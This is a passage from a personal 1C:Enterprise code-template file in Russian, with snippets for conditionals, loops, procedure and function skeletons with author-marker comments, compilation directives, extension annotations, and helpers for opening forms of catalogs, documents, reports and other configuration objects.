{1,
{145,
{"КучеровРМ (сниппеты)",1,0,"",""},
{3,
{"Стандартные",1,0,"",""},
{43,
{"Управляющие",1,0,"",""},
{0,
{"Если",0,0,"Если","Если <?""Условие""> Тогда
	<?>
КонецЕсли;"}
},
{0,
{"Если с комментарием",0,0,"ЕслиКом","Если <?""Условие""> Тогда //<?""Комментарий"">
	<?>
КонецЕсли; //<?""Комментарий"">"}
},
{0,
{"Если с условием (если кода много в условии)",0,0,"Если","Если <?""Условие""> Тогда
	<?>
КонецЕсли; //<?""Условие"">"}
},
{0,
{"ИначеЕсли",0,0,"ИначеЕ","ИначеЕсли <?""Условие""> Тогда
	<?>"}
},
{0,
{"ЕслиИначе",0,0,"ЕслиИ[наче]","Если <?""Условие""> Тогда
	<?>
Иначе
	
КонецЕсли;"}
},
{0,
{"Если ИначеЕсли Иначе ",0,0,"ЕслиИЕ","Если <?""Условие""> Тогда
	<?>
ИначеЕсли  Тогда
	
Иначе
	
КонецЕсли;"}
},
{0,
{"Пока",0,0,"Пока","Пока <?""Условие""> Цикл
	
	<?>
	
КонецЦикла;"}
},
{0,
{"Для",0,0,"Для","Для <?""Счетчик""> По <?""Ограничение""> Цикл
	
	<?>
	
КонецЦикла;"}
},
{0,
{"Для каждого",0,0,"Для[ Каждого]","Для каждого <?""Переменная""> Из <?""Коллекция""> Цикл
	
	<?>
	
КонецЦикла;"}
},
{0,
{"Для каждого Цикл снизу-вверх",0,0,"ДляСВ","л<?""Коллекция"">Количество = -(<?""Коллекция"">.Количество() - 1);
Для ии = л<?""Коллекция"">Количество По 0 Цикл //Обработаем элементы в <?""Коллекция"">, направляясь снизу вверх
	
	<?""Переменная""> 	= л<?""Коллекция"">[-ии];
	<?>	
	
КонецЦикла;"}
},
{0,
{"Для каждого Цикл удаления снизу-вверх (Для списка выбора с пометкой)",0,0,"ДляСВ","Для каждого <?""Переменная""> Из <?""Коллекция""> Цикл
	
	Если <?""Переменная"">.Пометка Тогда //Сначала обработка отмеченных пометкой
		<?>
	КонецЕсли; 
	
КонецЦикла; 

л<?""Коллекция"">Количество = -(<?""Коллекция"">.Количество() - 1);
Для ии = л<?""Коллекция"">Количество По 0 Цикл //Удалим все отмеченные элементы в <?""Коллекция"">, направляясь снизу вверх
	
	<?""Переменная""> 	= л<?""Коллекция"">[-ии];
	Если <?""Переменная"">.Пометка Тогда
		<?""Коллекция"">.Удалить(<?""Переменная"">);
	КонецЕсли;	
	
КонецЦикла;"}
},
{0,
{"Для каждого Строка",0,0,"Для[ Каждого]","Для каждого <?""Коллекция"">Строка Из <?""Коллекция""> Цикл
	
	<?""Коллекция"">Строка<?>
	
КонецЦикла;"}
},
{0,
{"Для каждого<?""Коллекция""> Элем",0,0,"Для[ Каждого]","Для каждого <?""Коллекция"">Элем Из <?""Коллекция""> Цикл
	
	<?""Коллекция"">Элем<?>
	
КонецЦикла;"}
},
{0,
{"Для каждого лЭлем",0,0,"Для[ Каждого]","Для каждого лЭлем Из <?""Коллекция""> Цикл
	
	лЭлем<?>
	
КонецЦикла;"}
},
{0,
{"Для каждого Элем XMLСтрока (обратно ПолучитьСсылку, XMLЗначение)",0,0,"Для[ Каждого]","Для каждого <?""Коллекция"">Элем Из <?""Коллекция""> Цикл //Получить УникальныйИдентификатор через XMLСтрока
	
	Сообщить(Строка(<?""Коллекция"">Элем) + ""	"" + XMLСтрока(<?""Коллекция"">Элем));
	
КонецЦикла;"}
},
{0,
{"Для каждого Элем XMLЗначение (обратно XMLСтрока)",0,0,"Для[ Каждого]","<?""Коллекция"">Тип 	= Тип(""СправочникСсылка.Контрагенты"");
Для каждого <?""Коллекция"">СтрокаXML Из <?""Коллекция""> Цикл //Получить XMLЗначение из УникальныйИдентификатор (СтрокаXML)
	
	Сообщить(Строка(<?""Коллекция"">СтрокаXML) + ""	"" + XMLЗначение(<?""Коллекция"">Тип, <?""Коллекция"">СтрокаXML));
	
КонецЦикла;"}
},
{0,
{"Для каждого Элем ПолучитьСсылку (обратно XMLСтрока)",0,0,"Для[ Каждого]","<?""Коллекция"">Тип 	= Справочники.Контрагенты;
Для каждого <?""Коллекция"">Элем Из <?""Коллекция""> Цикл //Получить УникальныйИдентификатор через XMLСтрока
	
	<?""Коллекция"">ЭлемСтрока 	= Строка(<?""Коллекция"">Элем);
	Сообщить(л<?""Коллекция"">ЭлемСтрока + ""	"" + Строка(<?""Коллекция"">Тип.ПолучитьСсылку(Новый УникальныйИдентификатор(<?""Коллекция"">ЭлемСтрока))));
	
КонецЦикла;"}
},
{0,
{"Для каждого Элем Ключ-Значение",0,0,"Для[ Каждого]","Для каждого <?""Коллекция"">Элем Из <?""Коллекция""> Цикл
	
	<?""Коллекция"">Элем<?>.Значение 	= <?""Коллекция"">Элем<?>.Ключ;
	
КонецЦикла;"}
},
{0,
{"Для каждого счетчик",0,0,"Для[ Каждого]","лСчетчик 				= 0;
<?""Коллекция"">Количество 	= <?""Коллекция"">.Количество();
Для Каждого <?""Переменная""> Из <?""Коллекция""> Цикл
	
	лСчетчик 	= лСчетчик + 1; 
	Состояние("""" + <?""Переменная""> + "" "" + лСчетчик + "" из "" + <?""Коллекция"">Количество);
	<?>
	
	ОбработкаПрерыванияПользователя();
	
КонецЦикла;"}
},
{0,
{"Перем",0,0,"Перем","//+++ АйТи КучеровРМ <?"""", ДатаВремя, ""ДФ=dd.MM.yyyy"">
Перем <?""Имя переменной"">; //--- АйТи КучеровРМ <?"""", ДатаВремя, ""ДФ=dd.MM.yyyy"">"}
},
{0,
{"Процедура",0,0,"Проц[едура]","//+++ АйТи КучеровРМ <?"""", ДатаВремя, ""ДФ=dd.MM.yyyy"">
Процедура <?""Имя процедуры"">()
	
	<?>
	
КонецПроцедуры // <?""Имя процедуры"">() //--- АйТи КучеровРМ <?"""", ДатаВремя, ""ДФ=dd.MM.yyyy"">
"}
},
{0,
{"Процедура доработана",0,0,"ПроцДор[абот]","//+++ АйТи КучеровРМ <?"""", ДатаВремя, ""ДФ=dd.MM.yyyy"">
Процедура <?""Имя процедуры"">_Доработан()
	
	//ОРИГИНАЛ
	#Область ОРИГИНАЛ
	
	#КонецОбласти // ОРИГИНАЛ 
	<?>
	
	//ДОРАБОТАН
	#Область ДОРАБОТАН
	
	#КонецОбласти // ДОРАБОТАН 
	
КонецПроцедуры // <?""Имя процедуры"">_Доработан() //--- АйТи КучеровРМ <?"""", ДатаВремя, ""ДФ=dd.MM.yyyy"">
"}
},
{0,
{"Процедура (с заголовком)",0,0,"Проц[едура]","//Процедура <?>
//-------------------------------------------------------------------------
//Параметры:
//		Параметр 	- Тип 	- описание
//-------------------------------------------------------------------------
//+++ АйТи КучеровРМ <?"""", ДатаВремя, ""ДФ=dd.MM.yyyy"">
Процедура <?""Имя процедуры"">()
	
	<?>
	
КонецПроцедуры // <?""Имя процедуры"">() //--- АйТи КучеровРМ <?"""", ДатаВремя, ""ДФ=dd.MM.yyyy"">
"}
},
{0,
{"Процедура модуля формы",0,0,"Проц[едура]","//Процедура <?>
//-------------------------------------------------------------------------
//Параметры:
//		Параметр 	- Тип 	- описание
//-------------------------------------------------------------------------
//+++ АйТи КучеровРМ <?"""", ДатаВремя, ""ДФ=dd.MM.yyyy"">
&<?""Выберите директиву компиляции"", ВыборВарианта, ""НаКлиенте"", ""НаКлиенте"", ""НаСервере"", ""НаСервере"", ""НаСервереБезКонтекста"", ""НаСервереБезКонтекста"", ""НаКлиентеНаСервереБезКонтекста"", ""НаКлиентеНаСервереБезКонтекста"">
Процедура <?""Имя процедуры"">()
	
	<?>
	
КонецПроцедуры // <?""Имя процедуры"">() //--- АйТи КучеровРМ <?"""", ДатаВремя, ""ДФ=dd.MM.yyyy"">
"}
},
{0,
{"Процедура модуля команды",0,0,"Проц[едура]","//Процедура <?>
//-------------------------------------------------------------------------
//Параметры:
//		Параметр 	- Тип 	- описание
//-------------------------------------------------------------------------
//+++ АйТи КучеровРМ <?"""", ДатаВремя, ""ДФ=dd.MM.yyyy"">
&<?""Выберите директиву компиляции"", ВыборВарианта, ""НаКлиенте"", ""НаКлиенте"", ""НаСервере"", ""НаСервере"", ""НаКлиентеНаСервере"", ""НаКлиентеНаСервере"">
Процедура <?""Имя процедуры"">()
	
	<?>
	
КонецПроцедуры // <?""Имя процедуры"">() //--- АйТи КучеровРМ <?"""", ДатаВремя, ""ДФ=dd.MM.yyyy"">
"}
},
{0,
{"Функция",0,0,"Функ[ция]","//+++ АйТи КучеровРМ <?"""", ДатаВремя, ""ДФ=dd.MM.yyyy"">
Функция <?""Имя функции"">()
	
	лРезультат 	= Неопределено;
	
	<?>
	
	Возврат лРезультат;
	
КонецФункции // <?""Имя функции"">() //--- АйТи КучеровРМ <?"""", ДатаВремя, ""ДФ=dd.MM.yyyy"">
"}
},
{0,
{"Функция доработана",0,0,"ФункДор[абот]","//+++ АйТи КучеровРМ <?"""", ДатаВремя, ""ДФ=dd.MM.yyyy"">
Функция <?""Имя функции"">_Доработан()
	
	лРезультат 	= Неопределено;
	
	//ОРИГИНАЛ
	#Область ОРИГИНАЛ
	
	#КонецОбласти // ОРИГИНАЛ 
	<?>
	
	//ДОРАБОТАН
	#Область ДОРАБОТАН
	
	#КонецОбласти // ДОРАБОТАН
	
	Возврат лРезультат;
	
КонецФункции // <?""Имя функции"">_Доработан() //--- АйТи КучеровРМ <?"""", ДатаВремя, ""ДФ=dd.MM.yyyy"">
"}
},
{0,
{"Функция Результат",0,0,"ВозвРез[ульт]","лРезультат<?""Подписать результату (слитно, напр Успех)""> 	= Неопределено;
<?>
Возврат лРезультат<?""Подписать результату (слитно, напр Успех)"">;"}
},
{0,
{"Функция (с заголовком)",0,0,"Функ[ция]","//Функция <?>
//-------------------------------------------------------------------------
//Параметры:
//		Параметр 	- Тип 	- описание
//Возвращаемое значение:
//		Тип 	- описание
//-------------------------------------------------------------------------
//+++ АйТи КучеровРМ <?"""", ДатаВремя, ""ДФ=dd.MM.yyyy"">
Функция <?""Имя функции"">()
	
	лРезультат 	= Неопределено;
	<?>
	Возврат лРезультат;
	
КонецФункции // <?""Имя функции"">() //--- АйТи КучеровРМ <?"""", ДатаВремя, ""ДФ=dd.MM.yyyy"">
"}
},
{0,
{"Функция модуля формы",0,0,"Функ[ция]","//Функция <?>
//-------------------------------------------------------------------------
//Параметры:
//		Параметр 	- Тип 	- описание
//Возвращаемое значение:
//		Тип 	- описание
//-------------------------------------------------------------------------
//+++ АйТи КучеровРМ <?"""", ДатаВремя, ""ДФ=dd.MM.yyyy"">
&<?""Выберите директиву компиляции"", ВыборВарианта, ""НаКлиенте"", ""НаКлиенте"", ""НаСервере"", ""НаСервере"", ""НаСервереБезКонтекста"", ""НаСервереБезКонтекста"", ""НаКлиентеНаСервереБезКонтекста"", ""НаКлиентеНаСервереБезКонтекста"">
Функция <?""Имя функции"">()
	
	лРезультат 	= Неопределено;
	<?>
	Возврат лРезультат;
	
КонецФункции // <?""Имя функции"">() //--- АйТи КучеровРМ <?"""", ДатаВремя, ""ДФ=dd.MM.yyyy"">
"}
},
{0,
{"Функция модуля команды",0,0,"Функ[ция]","//Функция <?>
//-------------------------------------------------------------------------
//Параметры:
//		Параметр 	- Тип 	- описание
//Возвращаемое значение:
//		Тип 	- описание
//-------------------------------------------------------------------------
//+++ АйТи КучеровРМ <?"""", ДатаВремя, ""ДФ=dd.MM.yyyy"">
&<?""Выберите директиву компиляции"", ВыборВарианта, ""НаКлиенте"", ""НаКлиенте"", ""НаСервере"", ""НаСервере"", ""НаКлиентеНаСервере"", ""НаКлиентеНаСервере"">
Функция <?""Имя функции"">()
	
	лРезультат 	= Неопределено;
	<?>
	Возврат лРезультат;
	
КонецФункции // <?""Имя функции"">() //--- АйТи КучеровРМ <?"""", ДатаВремя, ""ДФ=dd.MM.yyyy"">
"}
},
{0,
{"Возврат",0,0,"Возвр","Возврат <?>;"}
},
{0,
{"Попытка",0,0,"Попы[тка]","Попытка
	
	<?>
	
Исключение
	лСообщениеОшибки 	= ""Ошибка: "" + ОписаниеОшибки();
	Сообщить(лСообщениеОшибки, СтатусСообщения.Важное);
КонецПопытки;"}
},
{0,
{"Директива компиляции",0,0,"Дирек[тива]","&<?""Выберите директиву компиляции"", ВыборВарианта, ""НаКлиенте"", ""НаКлиенте"", ""НаСервере"", ""НаСервере"", ""НаСервереБезКонтекста"", ""НаСервереБезКонтекста"", ""НаКлиентеНаСервере"", ""НаКлиентеНаСервере"", ""НаКлиентеНаСервереБезКонтекста"", ""НаКлиентеНаСервереБезКонтекста"">"}
},
{0,
{"Инструкция Если",0,0,"Инстр[укция]","#Если <?""Выберите инструкцию препроцессора"", ВыборВарианта, ""Сервер"", ""Сервер"", ""Клиент"", ""Клиент"", ""ТонкийКлиент"", ""ТонкийКлиент"", ""ВебКлиент"", ""ВебКлиент"", ""ВнешнееСоединение"", ""ВнешнееСоединение"", ""ТолстыйКлиентУправляемоеПриложение"", ""ТолстыйКлиентУправляемоеПриложение"", ""ТолстыйКлиентОбычноеПриложение"", ""ТолстыйКлиентОбычноеПриложение""> Тогда
	<?>
#КонецЕсли"}
},
{0,
{"Инструкция Область",0,0,"#Обл[асть]","#Область <?>

#КонецОбласти"}
},
{0,
{"Аннотации Расширения в 8.15 при &ИзменениеИКонтроль - Удаление",0,0,"№удал[ен]","#Удаление
<?>
#КонецУдаления"}
},
{0,
{"Аннотации Расширения в 8.15 при &ИзменениеИКонтроль - Вставка",0,0,"№вст[авк]","#Вставка
<?>
#КонецВставки"}
},
{0,
{"&Аннотация(""ИмяИсходногоМетода"")",0,0,"?Анн[отаци]","<?""Выберите аннотацию"", ВыборВарианта, ""&Перед"", ""&Перед"", ""&После"", ""&После"", ""&Вместо"", ""&Вместо"", ""&ИзменениеИКонтроль"", ""&ИзменениеИКонтроль"">(""ИмяИсходногоМетода"")"}
},
{0,
{"&Перед(""ИмяИсходногоМетода"")",0,0,"?АннП[ере]","<?""Выберите аннотацию"", ВыборВарианта, ""&Перед"", ""&Перед"", ""&После"", ""&После"", ""&Вместо"", ""&Вместо"", ""&ИзменениеИКонтроль"", ""&ИзменениеИКонтроль"">(""ИмяИсходногоМетода"")"}
},
{0,
{"&После(""ИмяИсходногоМетода"")",0,0,"?АннП[осл]","<?""Выберите аннотацию"", ВыборВарианта, ""&Перед"", ""&Перед"", ""&После"", ""&После"", ""&Вместо"", ""&Вместо"", ""&ИзменениеИКонтроль"", ""&ИзменениеИКонтроль"">(""ИмяИсходногоМетода"")"}
},
{0,
{"&Вместо(""ИмяИсходногоМетода"")",0,0,"?АннВ[мест]","<?""Выберите аннотацию"", ВыборВарианта, ""&Перед"", ""&Перед"", ""&После"", ""&После"", ""&Вместо"", ""&Вместо"", ""&ИзменениеИКонтроль"", ""&ИзменениеИКонтроль"">(""ИмяИсходногоМетода"")"}
},
{0,
{"&ИзменениеИКонтроль(""ИмяИсходногоМетода"")",0,0,"?АннИ[ИК]","<?""Выберите аннотацию"", ВыборВарианта, ""&Перед"", ""&Перед"", ""&После"", ""&После"", ""&Вместо"", ""&Вместо"", ""&ИзменениеИКонтроль"", ""&ИзменениеИКонтроль"">(""ИмяИсходногоМетода"")"}
}
},
{18,
{"Прикладные",1,0,"",""},
{0,
{"Перечисление",0,1,"Переч[исление]","ПредопределенноеЗначение(""Перечисление.<?""Выберите значение перечисления"", ЗначениеПеречисления>"")"}
},
{2,
{"Функциональные опции",1,0,"",""},
{0,
{"Получить функциональную опцию",0,1,"Функ[циональная опция]","ПолучитьФункциональнуюОпцию(""<?""Выберите функциональную опцию"", ОбъектМетаданных, ""ФункциональнаяОпция"">"")"}
},
{0,
{"Получить функциональную опцию интерфейса",0,1,"Функ[циональная опция]","ПолучитьФункциональнуюОпциюИнтерфейса(""<?""Выберите функциональную опцию"", ОбъектМетаданных, ""ФункциональнаяОпция"">"")"}
}
},
{4,
{"Общие формы",1,0,"",""},
{0,
{"Открыть общую форму",0,0,"Открыть[Форму]","ОткрытьФорму(""ОбщаяФорма.<?""Выберите общую форму"", ОбъектМетаданных, ""ОбщаяФорма"">"");"}
},
{0,
{"Открыть общую форму (с параметрами)",0,0,"","ПараметрыФормы = Новый Структура;
ПараметрыФормы.Вставить(""<?>"", );
ОткрытьФорму(""ОбщаяФорма.<?""Выберите общую форму"", ОбъектМетаданных, ""ОбщаяФорма"">"", ПараметрыФормы);"}
},
{0,
{"Получить общую форму",0,0,"Получить[Форму]","ПолучитьФорму(""ОбщаяФорма.<?""Выберите общую форму"", ОбъектМетаданных, ""ОбщаяФорма"">"");"}
},
{0,
{"Получить общую форму (с параметрами)",0,0,"","ПараметрыФормы = Новый Структура;
ПараметрыФормы.Вставить(""<?>"", );
Форма = ПолучитьФорму(""ОбщаяФорма.<?""Выберите общую форму"", ОбъектМетаданных, ""ОбщаяФорма"">"");
"}
}
},
{5,
{"Планы обмена",1,0,"",""},
{0,
{"Открыть форму плана обмена",0,0,"Открыть[Форму]","ОткрытьФорму(""ПланОбмена.<?""Выберите план обмена"", ПланОбмена>.<?""Выберите форму"", ВыборВарианта, ""Объекта"", ""ФормаОбъекта"", ""Списка"", ""ФормаСписка"", ""Выбора"", ""ФормаВыбора"", ""Произвольная"", ""Форма."">"");"}
},
{0,
{"Открыть форму плана обмена (с параметрами)",0,0,"","ПараметрыФормы = Новый Структура;
ПараметрыФормы.Вставить(""<?>"", );
ОткрытьФорму(""ПланОбмена.<?""Выберите план обмена"", ПланОбмена>.<?""Выберите форму"", ВыборВарианта, ""Объекта"", ""ФормаОбъекта"", ""Списка"", ""ФормаСписка"", ""Выбора"", ""ФормаВыбора"", ""Произвольная"", ""Форма."">"", ПараметрыФормы);"}
},
{0,
{"Получить форму плана обмена",0,0,"Получить[Форму]","ПолучитьФорму(""ПланОбмена.<?""Выберите план обмена"", ПланОбмена>.<?""Выберите форму"", ВыборВарианта, ""Объекта"", ""ФормаОбъекта"", ""Списка"", ""ФормаСписка"", ""Выбора"", ""ФормаВыбора"", ""Произвольная"", ""Форма."">"");"}
},
{0,
{"Получить форму плана обмена (с параметрами)",0,0,"","ПараметрыФормы = Новый Структура;
ПараметрыФормы.Вставить(""<?>"", );
Форма = ПолучитьФорму(""ПланОбмена.<?""Выберите план обмена"", ПланОбмена>.<?""Выберите форму"", ВыборВарианта, ""Объекта"", ""ФормаОбъекта"", ""Списка"", ""ФормаСписка"", ""Выбора"", ""ФормаВыбора"", ""Произвольная"", ""Форма."">"", ПараметрыФормы);
"}
},
{0,
{"Обход элементов",0,0,"","Выборка = ПланыОбмена.<?"""", ПланОбмена>.Выбрать();

Пока Выборка.Следующий() Цикл

	<?>

КонецЦикла;"}
}
},
{3,
{"Константы",1,0,"",""},
{0,
{"Получить/установить",0,0,"Конст[анты]","Константы.<?"""", Константа>.<?""Выбор метода"", ВыборВарианта, ""Получить"", ""Получить"", ""Установить"", ""Установить"">()"}
},
{0,
{"Установить",0,0,"","Константы.<?"""", Константа>.Установить(<?>);"}
},
{0,
{"Получить",0,0,"","Константы.<?"""", Константа>.Получить()"}
}
},
{6,
{"Справочники",1,0,"",""},
{0,
{"Открыть форму справочника",0,0,"Открыть[Форму]","ОткрытьФорму(""Справочник.<?""Выберите справочник"", Справочник>.<?""Выберите форму"", ВыборВарианта, ""Объекта"", ""ФормаОбъекта"", ""Списка"", ""ФормаСписка"", ""Выбора"", ""ФормаВыбора"", ""Группы"", ""ФормаГруппы"", ""Выбора группы"", ""ФормаВыбораГруппы"", ""Произвольная"", ""Форма.""><?>"");"}
},
{0,
{"Открыть форму справочника (с параметрами)",0,0,"","ПараметрыФормы = Новый Структура;
ПараметрыФормы.Вставить(""<?>"", );
ОткрытьФорму(""Справочник.<?""Выберите справочник"", Справочник>.<?""Выберите форму"", ВыборВарианта, ""Объекта"", ""ФормаОбъекта"", ""Списка"", ""ФормаСписка"", ""Выбора"", ""ФормаВыбора"", ""Группы"", ""ФормаГруппы"", ""Выбора группы"", ""ФормаВыбораГруппы"", ""Произвольная"", ""Форма."">"", ПараметрыФормы);"}
},
{0,
{"Получить форму справочника",0,0,"Получить[Форму]","ПолучитьФорму(""Справочник.<?""Выберите справочник"", Справочник>.<?""Выберите форму"", ВыборВарианта, ""Объекта"", ""ФормаОбъекта"", ""Списка"", ""ФормаСписка"", ""Выбора"", ""ФормаВыбора"", ""Группы"", ""ФормаГруппы"", ""Выбора группы"", ""ФормаВыбораГруппы"", ""Произвольная"", ""Форма.""><?>"");"}
},
{0,
{"Получить форму справочника (с параметрами)",0,0,"","ПараметрыФормы = Новый Структура;
ПараметрыФормы.Вставить(""<?>"", );
Форма = ПолучитьФорму(""Справочник.<?""Выберите справочник"", Справочник>.<?""Выберите форму"", ВыборВарианта, ""Объекта"", ""ФормаОбъекта"", ""Списка"", ""ФормаСписка"", ""Выбора"", ""ФормаВыбора"", ""Группы"", ""ФормаГруппы"", ""Выбора группы"", ""ФормаВыбораГруппы"", ""Произвольная"", ""Форма."">"", ПараметрыФормы);
"}
},
{0,
{"Обход элементов",0,0,"","Выборка = Справочники.<?"""", Справочник>.Выбрать();

Пока Выборка.Следующий() Цикл

	<?>

КонецЦикла;"}
},
{0,
{"Обход элементов иерархически",0,0,"","Выборка = Справочники.<?"""", Справочник>.ВыбратьИерархически();

Пока Выборка.Следующий() Цикл

	<?>

КонецЦикла;"}
}
},
{6,
{"Документы",1,0,"",""},
{0,
{"Открыть форму документа",0,0,"Открыть[Форму]","ОткрытьФорму(""Документ.<?""Выберите документ"", Документ>.<?""Выберите форму"", ВыборВарианта, ""Объекта"", ""ФормаОбъекта"", ""Списка"", ""ФормаСписка"", ""Выбора"", ""ФормаВыбора"", ""Произвольная"", ""Форма.""><?>"");"}
},
{0,
{"Открыть форму документа (с параметрами)",0,0,"","ПараметрыФормы = Новый Структура;
ПараметрыФормы.Вставить(""<?>"", );
ОткрытьФорму(""Документ.<?""Выберите документ"", Документ>.<?""Выберите форму"", ВыборВарианта, ""Объекта"", ""ФормаОбъекта"", ""Списка"", ""ФормаСписка"", ""Выбора"", ""ФормаВыбора"", ""Произвольная"", ""Форма."">"", ПараметрыФормы);"}
},
{0,
{"Получить форму документа",0,0,"Получить[Форму]","ПолучитьФорму(""Документ.<?""Выберите документ"", Документ>.<?""Выберите форму"", ВыборВарианта, ""Объекта"", ""ФормаОбъекта"", ""Списка"", ""ФормаСписка"", ""Выбора"", ""ФормаВыбора"", ""Произвольная"", ""Форма.""><?>"");"}
},
{0,
{"Получить форму документа (с параметрами)",0,0,"","ПараметрыФормы = Новый Структура;
ПараметрыФормы.Вставить(""<?>"", );
Форма = ПолучитьФорму(""Документ.<?""Выберите документ"", Документ>.<?""Выберите форму"", ВыборВарианта, ""Объекта"", ""ФормаОбъекта"", ""Списка"", ""ФормаСписка"", ""Выбора"", ""ФормаВыбора"", ""Произвольная"", ""Форма."">"", ПараметрыФормы);
"}
},
{0,
{"Обход документов",0,0,"","Выборка = Документы.<?"""", Документ>.Выбрать();

Пока Выборка.Следующий() Цикл

	<?>

КонецЦикла;"}
},
{0,
{"Движения",0,0,"","Движения.<?""Выбор регистра"", ОбъектМетаданных, ""РегистрСведений"", ""РегистрНакопления"", ""РегистрБухгалтерии"", ""РегистрРасчета"">"}
}
},
{4,
{"Отчеты",1,0,"",""},
{0,
{"Открыть форму отчета",0,0,"Открыть[Форму]","ОткрытьФорму(""Отчет.<?""Выберите отчет"", Отчет>.<?""Выберите форму"", ВыборВарианта, ""Форма"", ""Форма"", ""ФормаНастроек"", ""ФормаНастроек"", ""ФормаРедактированияВарианта"", ""ФормаРедактированияВарианта"", ""Произвольная"", ""Форма.""><?>"");"}
},
{0,
{"Открыть форму отчета (с параметрами)",0,0,"Открыть[Форму]","ПараметрыФормы = Новый Структура;
ПараметрыФормы.Вставить(""<?>"", );
ОткрытьФорму(""Отчет.<?""Выберите отчет"", Отчет>.<?""Выберите форму"", ВыборВарианта, ""Форма"", ""Форма"", ""ФормаНастроек"", ""ФормаНастроек"", ""ФормаРедактированияВарианта"", ""ФормаРедактированияВарианта"", ""Произвольная"", ""Форма."">"", ПараметрыФормы);"}
},
{0,
{"Получить форму отчета",0,0,"Получить[Форму]","ПолучитьФорму(""Отчет.<?""Выберите отчет"", Отчет>.<?""Выберите форму"", ВыборВарианта, ""Форма"", ""Форма"", ""ФормаНастроек"", ""ФормаНастроек"", ""ФормаРедактированияВарианта"", ""ФормаРедактированияВарианта"", ""Произвольная"", ""Форма.""><?>"");"}
},
{0,
{"Получить форму отчета (с параметрами)",0,0,"Получить[Форму]","ПараметрыФормы = Новый Структура;
ПараметрыФормы.Вставить(""<?>"", );
Форма = ПолучитьФорму(""Отчет.<?""Выберите отчет"", Отчет>.<?""Выберите форму"", ВыборВарианта, ""Форма"", ""Форма"", ""ФормаНастроек"", ""ФормаНастроек"", ""ФормаРедактированияВарианта"", ""ФормаРедактированияВарианта"", ""Произвольная"", ""Форма."">"", ПараметрыФормы);
"}
}
},
{4,
{"Обработки",1,0,"",""},
{0,
{"Открыть форму обработки",0,0,"Открыть[Форму]","ОткрытьФорму(""Обработка.<?""Выберите обработку"", Обработка>.<?""Выберите форму"", ВыборВарианта, ""Форма"", ""Форма"", ""Произвольная"", ""Форма.""><?>"");"}
},
{0,
{"Открыть форму обработки (с параметрами)",0,0,"Открыть[Форму]","ПараметрыФормы = Новый Структура;
ПараметрыФормы.Вставить(""<?>"", );
ОткрытьФорму(""Обработка.<?""Выберите обработку"", Обработка>.<?""Выберите форму"", ВыборВарианта, ""Форма"", ""Форма"", ""Произвольная"", ""Форма."">"", ПараметрыФормы);"}
},
{0,
{"Получить форму обработки",0,0,"Получить[Форму]","ПолучитьФорму(""Обработка.<?""Выберите обработку"", Обработка>.<?""Выберите форму"", ВыборВарианта, ""Форма"", ""Форма"", ""Произвольная"", ""Форма.""><?>"");"}
},
{0,
{"Получить форму обработки (с параметрами)",0,0,"Получить[Форму]","ПараметрыФормы = Новый Структура;
ПараметрыФормы.Вставить(""<?>"", );
Форма = ПолучитьФорму(""Обработка.<?""Выберите обработку"", Обработка>.<?""Выберите форму"", ВыборВарианта, ""Форма"", ""Форма"", ""Произвольная"", ""Форма."">"", ПараметрыФормы);
"}
}
},
{5,
{"Планы видов характеристик",1,0,"",""},
{0,
{"Открыть форму плана видов характеристик",0,0,"Открыть[Форму]","ОткрытьФорму(""ПланВидовХарактеристик.<?""Выберите ПВХ"", ПланВидовХарактеристик>.<?""Выберите форму"", ВыборВарианта, ""Объекта"", ""ФормаОбъекта"", ""Списка"", ""ФормаСписка"", ""Выбора"", ""ФормаВыбора"", ""Группы"", ""ФормаГруппы"", ""Выбора группы"", ""ФормаВыбораГруппы"", ""Произвольная"", ""Форма.""><?>"");"}
},
{0,
{"Открыть форму плана видов характеристик (с параметрами)",0,0,"","ПараметрыФормы = Новый Структура;
ПараметрыФормы.Вставить(""<?>"", );
ОткрытьФорму(""ПланВидовХарактеристик.<?""Выберите ПВХ"", ПланВидовХарактеристик>.<?""Выберите форму"", ВыборВарианта, ""Объекта"", ""ФормаОбъекта"", ""Списка"", ""ФормаСписка"", ""Выбора"", ""ФормаВыбора"", ""Группы"", ""ФормаГруппы"", ""Выбора группы"", ""ФормаВыбораГруппы"", ""Произвольная"", ""Форма."">"", ПараметрыФормы);"}
},
{0,
{"Получить форму плана видов характеристик",0,0,"Получить[Форму]","ПолучитьФорму(""ПланВидовХарактеристик.<?""Выберите ПВХ"", ПланВидовХарактеристик>.<?""Выберите форму"", ВыборВарианта, ""Объекта"", ""ФормаОбъекта"", ""Списка"", ""ФормаСписка"", ""Выбора"", ""ФормаВыбора"", ""Группы"", ""ФормаГруппы"", ""Выбора группы"", ""ФормаВыбораГруппы"", ""Произвольная"", ""Форма.""><?>"");"}
},
{0,
{"Получить форму плана видов характеристик (с параметрами)",0,0,"","ПараметрыФормы = Новый Структура;
ПараметрыФормы.Вставить(""<?>"", );
Форма = ПолучитьФорму(""ПланВидовХарактеристик.<?""Выберите ПВХ"", ПланВидовХарактеристик>.<?""Выберите форму"", ВыборВарианта, ""Объекта"", ""ФормаОбъекта"", ""Списка"", ""ФормаСписка"", ""Выбора"", ""ФормаВыбора"", ""Группы"", ""ФормаГруппы"", ""Выбора группы"", ""ФормаВыбораГруппы"", ""Произвольная"", ""Форма."">"", ПараметрыФормы);
"}
},
{0,
{"Обход видов характеристик",0,0,"","Выборка = ПланыВидовХарактеристик.<?"""", ПланВидовХарактеристик>.Выбрать();

Пока Выборка.Следующий() Цикл

	<?>

КонецЦикла;"}
}
},
{5,
{"Планы счетов",1,0,"",""},
{0,
{"Открыть форму плана счетов",0,0,"Открыть[Форму]","ОткрытьФорму(""ПланСчетов.<?""Выберите план счетов"", ПланСчетов>.<?""Выберите форму"", ВыборВарианта, ""Объекта"", ""ФормаОбъекта"", ""Списка"", ""ФормаСписка"", ""Выбора"", ""ФормаВыбора"", ""Произвольная"", ""Форма.""><?>"");"}
},
{0,
{"Открыть форму плана счетов (с параметрами)",0,0,"","ПараметрыФормы = Новый Структура;
ПараметрыФормы.Вставить(""<?>"", );
ОткрытьФорму(""ПланСчетов.<?""Выберите план счетов"", ПланСчетов>.<?""Выберите форму"", ВыборВарианта, ""Объекта"", ""ФормаОбъекта"", ""Списка"", ""ФормаСписка"", ""Выбора"", ""ФормаВыбора"", ""Произвольная"", ""Форма."">"", ПараметрыФормы);"}
},
{0,
{"Получить форму плана счетов",0,0,"Получить[Форму]","ПолучитьФорму(""ПланСчетов.<?""Выберите план счетов"", ПланСчетов>.<?""Выберите форму"", ВыборВарианта, ""Объекта"", ""ФормаОбъекта"", ""Списка"", ""ФормаСписка"", ""Выбора"", ""ФормаВыбора"", ""Произвольная"", ""Форма.""><?>"");"}
},
{0,
